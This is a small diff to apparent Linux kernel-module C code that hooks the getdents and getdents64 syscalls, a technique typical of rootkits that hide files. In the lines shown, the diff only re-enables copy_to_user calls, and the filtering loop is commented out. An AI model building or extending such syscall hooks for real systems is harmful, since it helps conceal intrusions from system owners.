@@ -116,7 +116,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
         }
         bpos += d->d_reclen; //next
     }*/
-    //copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace;
+    copy_to_user(dirp,buf,nread); //now put it back to userspace;
     //kfree(buf);
     //fileh=filp_open(nd->d_name,0,0);
     //printk("%d\n",test->f_path.dentry->d_inode->i_gid);
@@ -143,7 +143,7 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
         }
         bpos += d->d_reclen; //next
     }*/
-    //copy_to_user(dirp,(struct linux_dirent64 *)buf,sizeof(buf)); //now put it back to userspace
+    copy_to_user(dirp,buf,nread); //now put it back to userspace
     //kfree(buf);
     return nread; //and return so the user process can use the getdents
 }
